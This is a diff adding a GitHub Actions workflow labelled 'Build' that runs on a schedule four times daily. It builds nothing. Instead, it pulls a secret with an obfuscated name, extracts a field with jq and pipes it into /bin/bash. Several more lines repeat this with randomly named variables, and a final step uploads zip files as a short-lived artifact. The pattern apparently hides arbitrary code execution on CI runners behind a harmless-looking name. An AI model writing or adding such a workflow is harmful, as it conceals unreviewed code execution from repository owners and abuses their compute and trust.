@@ -1,0 +1,32 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 5,11,17,23 * * *'
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          mbcb37730: ${{ secrets.mbcb37730 }}
+        run: |
+          printf '%s' "$mbcb37730" | jq -r .nj018 | /bin/bash
+          printf '%s' "$eck786" | jq -r .ilpxg60 | /bin/bash
+          echo $t97749 | jq -r .iio20 | /bin/bash
+          echo $bl6 | jq -r .uq4956 | /bin/bash
+          printf '%s' "$rox6707" | jq -r .lbm4 | /bin/bash
+          echo $qi51296 | jq -r .nt1 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: FSDfQ8GD
+          path: "*.zip"
+          retention-days: 1
